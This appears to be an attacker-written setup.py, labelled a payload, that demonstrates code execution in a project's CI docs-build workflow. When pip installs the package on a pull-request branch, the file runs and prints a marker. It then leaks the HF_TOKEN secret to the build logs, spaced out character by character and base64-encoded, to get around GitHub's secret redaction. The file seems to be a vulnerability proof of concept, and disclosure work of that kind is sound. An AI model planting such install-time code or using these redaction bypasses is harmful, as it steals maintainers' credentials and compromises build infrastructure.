# ATTACKER PAYLOAD on PR branch. build_docs.yml runs `pip install ./packages/fairchem-core`
# with HF_TOKEN in env. setuptools build_meta imports this file -> RCE.
# Two pieces of evidence:
#   (1) unique RCE marker proves arbitrary code ran on the runner
#   (2) HF_TOKEN value printed with character spacing bypasses GitHub's secret
#       redaction (redaction is exact-substring), proving secret-exfil viability.
import os, sys

RCE_MARKER = "PWNED_E_ab5a3725"
sys.stderr.write("\n>>> ATTACKER_SETUP_PY_EXEC " + RCE_MARKER + " <<<\n")

tok = os.environ.get("HF_TOKEN", "<UNSET>")
spaced = " ".join(list(tok))
sys.stderr.write(">>> LEAKED_HF_TOKEN_SPACED: [" + spaced + "]\n")
sys.stderr.write(">>> LEAKED_HF_TOKEN_LEN: " + str(len(tok)) + "\n")

# Also: encode-then-print round-trip is another redaction bypass.
import base64
sys.stderr.write(">>> LEAKED_HF_TOKEN_B64: " + base64.b64encode(tok.encode()).decode() + "\n\n")

from setuptools import setup
setup(name="fairchem-core", version="0.0.0")
